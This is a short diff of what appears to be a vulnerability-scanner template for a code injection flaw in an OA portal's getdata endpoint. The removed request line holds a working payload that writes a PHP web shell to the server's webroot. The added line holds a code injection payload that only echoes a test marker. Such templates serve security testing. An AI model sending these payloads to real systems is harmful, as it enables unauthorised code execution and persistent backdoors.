@@ -13,9 +13,8 @@ info:
 http:
   - method: 
       - GET
-      - GET
     path:
-      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22C:/MYOA/webroot/general/1.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage"
+      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
       
     Rheader:
       - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 &  Accept-Encoding:gzip, deflate & Upgrade-Insecure-Requests:1
